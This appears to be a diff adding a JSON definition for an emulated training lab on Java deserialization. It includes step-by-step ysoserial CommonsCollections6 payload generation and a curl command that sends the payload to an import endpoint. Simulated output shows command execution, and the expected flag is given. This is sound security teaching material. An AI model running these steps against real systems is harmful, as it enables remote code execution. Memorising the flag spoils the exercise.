@@ -1,0 +1,27 @@
+{
+  "id": "web-tool-deser",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{y5os3r1al_cc6_g4dg3t}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: ysoserial/phpggc — gadget-цепочки\n\nУ `shop.local` есть эндпоинт импорта, десериализующий тело. Собери Java\npayload через ysoserial и отправь его.\n\n1. Генерируем CC6-payload (эмуляция ysoserial):\n\n   java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin\n\n2. Отправляем на уязвимый импорт и читаем флаг:\n\n   curl -s https://shop.local/api/import --data-binary @payload.bin > found.txt\n\n3. Набери `check`.\n" }
+  ],
+  "tools": {
+    "java": {
+      "help": "java -jar ysoserial.jar <gadget> <команда> — генератор gadget-цепочек (эмуляция)",
+      "cases": [
+        { "match": "ysoserial|CommonsCollections|gadget", "example": "-jar ysoserial.jar CommonsCollections6 'id'", "output": "[+] ysoserial 0.0.6 — gadget: CommonsCollections6\n[+] command: id\n[+] payload written to stdout (serialized Java object, 1287 bytes)\n" }
+      ],
+      "fallback": "java: в этой лабе эмулируется ysoserial.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "--data-binary|payload|api/import|import", "example": "-s https://shop.local/api/import --data-binary @payload.bin", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nnto{y5os3r1al_cc6_g4dg3t}\n" },
+        { "match": "shop\\.local", "example": "-s https://shop.local/", "output": "<!doctype html><title>shop</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется shop.local.\n"
+    }
+  }
+}
